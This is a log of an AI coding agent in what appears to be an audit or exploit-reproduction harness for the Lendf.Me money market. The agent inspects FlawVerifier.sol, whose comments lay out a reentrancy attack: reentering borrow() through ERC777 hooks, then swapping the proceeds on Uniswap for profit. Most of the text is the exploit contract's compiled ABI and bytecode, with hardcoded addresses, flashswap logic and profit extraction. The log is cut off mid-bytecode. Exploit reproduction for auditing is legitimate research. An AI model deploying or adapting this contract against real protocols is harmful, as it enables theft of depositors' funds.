+./FlawVerifier.sol:51:    function borrow(address asset, uint256 amount) external returns (uint256);
+./FlawVerifier.sol:131:contract FlawVerifier is IERC777Sender, IERC777Recipient, ICallee {
+./FlawVerifier.sol:132:    IMoneyMarket internal constant MONEY_MARKET = IMoneyMarket(0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea);
+./FlawVerifier.sol:191:            - `withdraw(asset, amount)` transfers out before `supplyBalances[msg.sender][asset]` is reduced.
+./FlawVerifier.sol:192:            - `borrow(asset, amount)` transfers out before `borrowBalances[msg.sender][asset]` and `market.totalBorrows` are updated.
+./FlawVerifier.sol:196:            - The sender-hook leg needed to drive `supply -> withdraw(asset, amount)` is present in code, but on this fork the
+./FlawVerifier.sol:197:              callback token's `supply(...)` / `doTransferIn(...)` path itself reverts before a scalable reentrant stage. That
+./FlawVerifier.sol:200:            - `repayBorrow` needs a pre-existing debt position in the callback token before entering its transfer-in hook, and
+./FlawVerifier.sol:202:              but they are not required because the directly executable path here is `borrow(asset, amount)` on the callback token.
+./FlawVerifier.sol:207:            3. Call `borrow(asset, amount)` on the callback token.
+./FlawVerifier.sol:208:            4. Reenter `borrow(asset, amount)` from the recipient hook while `borrowBalances[msg.sender][asset]` and
+./FlawVerifier.sol:211:            6. Sell only enough callback token on Uniswap V1 to repay the temporary capital, leaving the net remainder as profit.
+./FlawVerifier.sol:320:        require(marketCash > 1, "callback-market-empty");
+./FlawVerifier.sol:353:        revert("borrow-path-failed");
+./FlawVerifier.sol:384:        require(tokenBalance > 0, "no-callback-profit");
+./FlawVerifier.sol:434:        uint256 callbackBalance = IERC20Like(CALLBACK_TOKEN).balanceOf(address(this));
+codex
+I found hints of an older flashswap variant; now I’m checking the test harness and nearby context.
+exec
+/bin/bash -lc "sed -n '1,220p' test/ExploitPOC.t.sol && printf '\\n---\\n' && sed -n '1,260p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src exited 1 in 52ms:
+sed: test/ExploitPOC.t.sol: No such file or directory
+codex
+Test path differs here, so I’m locating the actual repo layout first.
+exec
+/bin/bash -lc "pwd && printf '\\n' && rg --files .. | rg 'ExploitPOC\\.t\\.sol|FlawVerifier\\.sol|AGENTS\\.md|foundry\\.toml|README|lendfme'" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src
+
+../src/FlawVerifier.sol
+../src/out/FlawVerifier.sol/IERC777Sender.json
+../src/out/FlawVerifier.sol/FlawVerifier.json
+../src/out/FlawVerifier.sol/IERC20Like.json
+../src/out/FlawVerifier.sol/Actions.json
+../src/out/FlawVerifier.sol/IUniswapV2Pair.json
+../src/out/FlawVerifier.sol/IWETH.json
+../src/out/FlawVerifier.sol/ICallee.json
+../src/out/FlawVerifier.sol/IUniswapV1Exchange.json
+../src/out/FlawVerifier.sol/Account.json
+../src/out/FlawVerifier.sol/IMoneyMarket.json
+../src/out/FlawVerifier.sol/IUniswapV1Factory.json
+../src/out/FlawVerifier.sol/IERC777Recipient.json
+../src/out/FlawVerifier.sol/Types.json
+../src/out/FlawVerifier.sol/ISoloMargin.json
+../src/out/FlawVerifier.sol/IERC1820Registry.json
+../src/out/FlawVerifier.sol/IUniswapV2Factory.json
+../src/out/FlawVerifier.sol/IUniswapV2Callee.json
+exec
+/bin/bash -lc "rg --files /Users/zhanglongqin/AuditHoundV2/cases/lendfme | rg 'ExploitPOC\\.t\\.sol|AGENTS\\.md|foundry\\.toml|FlawVerifier\\.sol|README|context|finding|log|trace'" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 50ms:
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/FlawVerifier.sol
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IERC777Sender.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/FlawVerifier.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IERC20Like.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/Actions.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IUniswapV2Pair.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IWETH.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/ICallee.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IUniswapV1Exchange.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/Account.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IMoneyMarket.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IUniswapV1Factory.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IERC777Recipient.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/Types.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/ISoloMargin.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IERC1820Registry.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IUniswapV2Factory.json
+/Users/zhanglongqin/AuditHoundV2/cases/lendfme/src/out/FlawVerifier.sol/IUniswapV2Callee.json
+codex
+Repo is minimal here; I’m extracting hints from artifacts and the current source.
+exec
+/bin/bash -lc "sed -n '1,260p' FlawVerifier.sol && printf '\\n--- ABI hint ---\\n' && jq -r '.abi[]?.name // empty' out/FlawVerifier.sol/FlawVerifier.json | sed -n '1,120p'" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 51ms:
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface IERC1820Registry {
+    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
+}
+
+interface IERC777Sender {
+    function tokensToSend(
+        address operator,
+        address from,
+        address to,
+        uint256 amount,
+        bytes calldata userData,
+        bytes calldata operatorData
+    ) external;
+}
+codex
+I’ve confirmed the current file diverges from older artifacts; now I’m mining those artifacts for workable constants and flow.
+exec
+/bin/bash -lc "rg -n \"executeFlashswap|uniswapV2Call|IUniswapV2|pair|factory|flashswap|MIN_REALIZED_WETH_PROFIT|CALLBACK_TOKEN|profitToken|profitAmount\" out/FlawVerifier.sol/FlawVerifier.json FlawVerifier.sol && printf '\\n--- source snippet if present ---\\n' && strings out/FlawVerifier.sol/FlawVerifier.json | rg -n \"executeFlashswap|uniswapV2Call|IUniswapV2|0x5C69|0xC0AE|0xA478|0xB4e16|0xBb2b|0x3041|0x004375\"" in /Users/zhanglongqin/AuditHoundV2/cases/lendfme/src succeeded in 3.17s:
+1:{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"executeFlashswap","inputs":[{"name":"loanAmount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"executeOnOpportunity","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"profitAmount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"profitToken","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"tokensReceived","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"from","type":"address","internalType":"address"},{"name":"to","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"tokensToSend","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"amount0","type":"uint256","internalType":"uint256"},{"name":"amount1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561000f575f5ffd5b5061001e61002360201b60201c565b6101ed565b731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307f29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895306040518463ffffffff1660e01b8152600401610094939291906101b8565b5f604051808303815f87803b1580156100ab575f5ffd5b505af11580156100bd573d5f5f3e3d5ffd5b50505050731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b306040518463ffffffff1660e01b8152600401610132939291906101b8565b5f604051808303815f87803b158015610149575f5ffd5b505af115801561015b573d5f5f3e3d5ffd5b50505050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61018a82610161565b9050919050565b61019a81610180565b82525050565b5f819050919050565b6101b2816101a0565b82525050565b5f6060820190506101cb5f830186610191565b6101d860208301856101a9565b6101e56040830184610191565b949350505050565b61377d806101fa5f395ff3fe608060405260043610610072575f3560e01c8063438865621161004d57806343886562146100e3578063493436241461010b5780635ff972cc1461013557806375ab97821461015f57610079565b806223de291461007d57806310d1e85c146100a55780633c2448ed146100cd57610079565b3661007957005b5f5ffd5b348015610088575f5ffd5b506100a3600480360381019061009e91906128c8565b610187565b005b3480156100b0575f5ffd5b506100cb60048036038101906100c69190612992565b610358565b005b3480156100d8575f5ffd5b506100e16107ca565b005b3480156100ee575f5ffd5b5061010960048036038101906101049190612a16565b6108ea565b005b348015610116575f5ffd5b5061011f61096c565b60405161012c9190612a50565b60405180910390f35b348015610140575f5ffd5b50610149610994565b6040516101569190612a78565b60405180910390f35b34801561016a575f5ffd5b50610185600480360381019061018091906128c8565b61099d565b005b5f60029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614158061021457506001808111156101f1576101f0612a91565b5b5f5f9054906101000a900460ff16600181111561021157610210612a91565b5b14155b61034e57730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff168773ffffffffffffffffffffffffffffffffffffffff1614158061029357503073ffffffffffffffffffffffffffffffffffffffff168673ffffffffffffffffffffffffffffffffffffffff1614155b61034e576001600254111561031d57600160025f82825403925050819055505f6102e05f60029054906101000a900473ffffffffffffffffffffffffffffffffffffffff166001546109a7565b905080610317575f6002819055505f5f5f6101000a81548160ff0219169083600181111561031157610310612a91565b5b02179055505b5061034d565b5f6002819055505f5f5f6101000a81548160ff0219169083600181111561034757610346612a91565b5b02179055505b5b5050505050505050565b3073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff16146103c6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103bd90612b18565b60405180910390fd5b5f5f83838101906103d79190612b71565b915091508173ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610449576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161044090612bf9565b60405180910390fd5b5f3373ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa158015610493573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104b79190612c2b565b90505f3373ffffffffffffffffffffffffffffffffffffffff1663d21220a76040518163ffffffff1660e01b8152600401602060405180830381865afa158015610503573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105279190612c2b565b905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614806105b6575073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16145b6105f5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105ec90612ca0565b60405180910390fd5b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146106435787610645565b885b9050838114610689576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161068090612d08565b60405180910390fd5b8373c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016106d79190612a50565b602060405180830381865afa1580156106f2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906107169190612d3a565b1015610757576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161074e90612daf565b60405180910390fd5b5f61076185610ab1565b905061076c81610b6a565b61077581610e94565b5f61077f86610f0b565b905061079d670186cc6acd4b0000826107989190612dfa565b610f3a565b6107bc73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc233836114da565b505050505050505050505050565b5f60019054906101000a900460ff166108e85760015f60016101000a81548160ff0219169083151502179055506107ff611641565b5f60035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f600481905550610863733212b29e33587a00fb1c83346f5dbfa69a45892361177f565b1580610889575061088773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc261177f565b155b6108e85761089f68056bc75e2d63100000611821565b670186cc6acd4b000060045410156108e8576108c3680d8d726b7177a80000611821565b670186cc6acd4b000060045410156108e8576108e7681b1ae4d6e2ef500000611821565b5b565b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610958576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161094f90612e77565b60405180910390fd5b61096181611910565b610969611b32565b50565b5f60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f600454905090565b5050505050505050565b5f5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff16634b8a352960e01b86866040516024016109f0929190612e95565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610a5a9190612f0e565b5f604051808303815f865af19150503d805f8114610a93576040519150601f19603f3d011682016040523d82523d5f602084013e610a98565b606091505b5091509150610aa78282611d77565b9250505092915050565b5f819050610b0873c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff611db2565b610b2673c02aaa39b223fe8d0a0e5c4f27ead9083c756cc282611f19565b610b65576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5c90612f6e565b60405180910390fd5b919050565b5f733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea6040518263ffffffff1660e01b8152600401610bcc9190612a50565b602060405180830381865afa158015610be7573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610c0b9190612d3a565b905060018111610c50576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c4790612fd6565b60405180910390fd5b733212b29e33587a00fb1c83346f5dbfa69a4589235f60026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f608082610cb29190613021565b90505f8103610cc057600190505b5f600190505f64e8d4a5100085610cd79190613021565b90508181118015610ce757508381105b15610cf0578091505b5b818310610e565782600181905550610d158385610d0e9190613021565b6018612023565b60028190555060015f5f6101000a81548160ff02191690836001811115610d3f57610d3e612a91565b5b02179055505f610d63733212b29e33587a00fb1c83346f5dbfa69a458923856109a7565b90505f5f5f6101000a81548160ff02191690836001811115610d8857610d87612a91565b5b0217905550808015610e24575083733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610de39190612a50565b602060405180830381865afa158015610dfe573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610e229190612d3a565b115b15610e33575050505050610e91565b60018403610e415750610e56565b600284610e4e9190613021565b935050610cf1565b6040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e889061309b565b60405180910390fd5b50565b5f8190505f8290505b5f82118015610eab57505f81115b15610f065781811115610ebc578190505b610eda73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28261204b565b15610ef2578082610eeb91906130b9565b9150610e9d565b600281610eff9190613021565b9050610e9d565b505050565b5f60016103e56103e884610f1f91906130ec565b610f299190613021565b610f339190612dfa565b9050919050565b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610f889190612a50565b602060405180830381865afa158015610fa3573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610fc79190612d3a565b9050818110610fd657506114d7565b5f73c0a47dfe034b400b47bdad5fecda2621de6c4d9573ffffffffffffffffffffffffffffffffffffffff166306f2bf62733212b29e33587a00fb1c83346f5dbfa69a4589236040518263ffffffff1660e01b81526004016110389190612a50565b602060405180830381865afa158015611053573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906110779190612c2b565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036110e7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110de90613177565b60405180910390fd5b5f733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016111359190612a50565b602060405180830381865afa158015611150573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906111749190612d3a565b90505f81116111b8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016111af906131df565b60405180910390fd5b6111f7733212b29e33587a00fb1c83346f5dbfa69a458923837fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff611db2565b5f611000826112069190613021565b90505f810361121457600190505b5f5f90505b600c8110156114005773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161126f9190612a50565b602060405180830381865afa15801561128a573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906112ae9190612d3a565b94508585101561140057733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016113059190612a50565b602060405180830381865afa158015611320573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906113449190612d3a565b92505f830315611400578282111561135a578291505b8373ffffffffffffffffffffffffffffffffffffffff166395e3c50b83600180426113859190612dfa565b6040518463ffffffff1660e01b81526004016113a39392919061323f565b6020604051808303815f875af11580156113bf573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906113e39190612d3a565b506113ec612155565b600182901b91508080600101915050611219565b5073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b815260040161144e9190612a50565b602060405180830381865afa158015611469573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061148d9190612d3a565b9350848410156114d2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016114c9906132be565b60405180910390fd5b505050505b50565b5f5f8473ffffffffffffffffffffffffffffffffffffffff168484604051602401611506929190612e95565b6040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516115909190612f0e565b5f604051808303815f865af19150503d805f81146115c9576040519150601f19603f3d011682016040523d82523d5f602084013e6115ce565b606091505b50915091508180156115fb57505f815114806115fa5750808060200190518101906115f99190613311565b5b5b61163a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161163190613386565b60405180910390fd5b5050505050565b731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307f29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895306040518463ffffffff1660e01b81526004016116b2939291906133bc565b5f604051808303815f87803b1580156116c9575f5ffd5b505af11580156116db573d5f5f3e3d5ffd5b50505050731820a4b7618bde71dce8cdc73aab6c95905fad2473ffffffffffffffffffffffffffffffffffffffff166329965a1d307fb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b306040518463ffffffff1660e01b8152600401611750939291906133bc565b5f604051808303815f87803b158015611767575f5ffd5b505af1158015611779573d5f5f3e3d5ffd5b50505050565b5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff16638e8f294b846040518263ffffffff1660e01b81526004016117ce9190612a50565b61012060405180830381865afa1580156117ea573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061180e91906133f1565b5050505050505050905080915050919050565b5f3073ffffffffffffffffffffffffffffffffffffffff16634388656260e01b836040516024016118529190612a78565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516118bc9190612f0e565b5f604051808303815f865af19150503d805f81146118f5576040519150601f19603f3d011682016040523d82523d5f602084013e6118fa565b606091505b505090508061190c5761190b611b32565b5b5050565b5f61191a826121d6565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361198a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611981906134ff565b60405180910390fd5b5f8173ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156119d4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906119f89190612c2b565b90505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614611a48575f611a4a565b835b90505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614611a9a5784611a9c565b5f5b90508373ffffffffffffffffffffffffffffffffffffffff1663022c0d9f838330888a604051602001611ad0929190612e95565b6040516020818303038152906040526040518563ffffffff1660e01b8152600401611afe9493929190613575565b5f604051808303815f87803b158015611b15575f5ffd5b505af1158015611b27573d5f5f3e3d5ffd5b505050505050505050565b611b3a612155565b5f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611b889190612a50565b602060405180830381865afa158015611ba3573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611bc79190612d3a565b90505f811115611c325773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc260035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508060048190555050611d75565b5f733212b29e33587a00fb1c83346f5dbfa69a45892373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401611c809190612a50565b602060405180830381865afa158015611c9b573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190611cbf9190612d3a565b90505f811115611d2b57733212b29e33587a00fb1c83346f5dbfa69a45892360035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806004819055505050611d75565b5f60035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f60048190555050505b565b5f821580611d86575060208251105b15611d93575f9050611dac565b5f82806020019051810190611da89190612d3a565b1490505b92915050565b5f5f8473ffffffffffffffffffffffffffffffffffffffff168484604051602401611dde929190612e95565b6040516020818303038152906040527f095ea7b3000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051611e689190612f0e565b5f604051808303815f865af19150503d805f8114611ea1576040519150601f19603f3d011682016040523d82523d5f602084013e611ea6565b606091505b5091509150818015611ed357505f81511480611ed2575080806020019051810190611ed19190613311565b5b5b611f12576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401611f0990613609565b60405180910390fd5b5050505050565b5f5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff1663f2b9fdb860e01b8686604051602401611f62929190612e95565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051611fcc9190612f0e565b5f604051808303815f865af19150503d805f8114612005576040519150601f19603f3d011682016040523d82523d5f602084013e61200a565b606091505b50915091506120198282611d77565b9250505092915050565b5f5f8303612033575f9050612045565b8183116120405782612042565b815b90505b92915050565b5f5f5f730eee3e3828a45f7601d5f54bf49bb01d1a9df5ea73ffffffffffffffffffffffffffffffffffffffff1663f3fef3a360e01b8686604051602401612094929190612e95565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516120fe9190612f0e565b5f604051808303815f865af19150503d805f8114612137576040519150601f19603f3d011682016040523d82523d5f602084013e61213c565b606091505b509150915061214b8282611d77565b9250505092915050565b5f4790505f8111156121d35773c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004015f604051808303818588803b1580156121bb575f5ffd5b505af11580156121cd573d5f5f3e3d5ffd5b50505050505b50565b5f5f6040518060600160405280736b175474e89094c44da98b954eedeac495271d0f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200173dac17f958d2ee523a2206206994597c13d831ec773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681525090505f5f5f90505b6003811015612528575f735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1663e6a4390573c02aaa39b223fe8d0a0e5c4f27ead9083c756cc286856003811061231d5761231c613627565b5b60200201516040518363ffffffff1660e01b815260040161233f929190613654565b602060405180830381865afa15801561235a573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061237e9190612c2b565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036123b9575061251b565b5f5f8273ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa158015612404573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061242891906136f7565b50915091505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa1580156124a2573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906124c69190612c2b565b73ffffffffffffffffffffffffffffffffffffffff16146124e757816124e9565b825b6dffffffffffffffffffffffffffff16905088811015801561250a57508581115b15612516578095508397505b505050505b80806001019150506122bb565b505f73ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146125635750506127cd565b5f5f90505b60038110156127c9575f735c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f73ffffffffffffffffffffffffffffffffffffffff1663e6a4390573c02aaa39b223fe8d0a0e5c4f27ead9083c756cc28685600381106125ca576125c9613627565b5b60200201516040518363ffffffff1660e01b81526004016125ec929190613654565b602060405180830381865afa158015612607573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061262b9190612c2b565b90505f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff160361266657506127bc565b5f5f8273ffffffffffffffffffffffffffffffffffffffff16630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa1580156126b1573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906126d591906136f7565b50915091505f73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16630dfe16816040518163ffffffff1660e01b8152600401602060405180830381865afa15801561274f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906127739190612c2b565b73ffffffffffffffffffffffffffffffffffffffff16146127945781612796565b825b6dffffffffffffffffffffffffffff169050858111156127b7578095508397505b505050505b8080600101915050612568565b5050505b919050565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f612803826127da565b9050919050565b612813816127f9565b811461281d575f5ffd5b50565b5f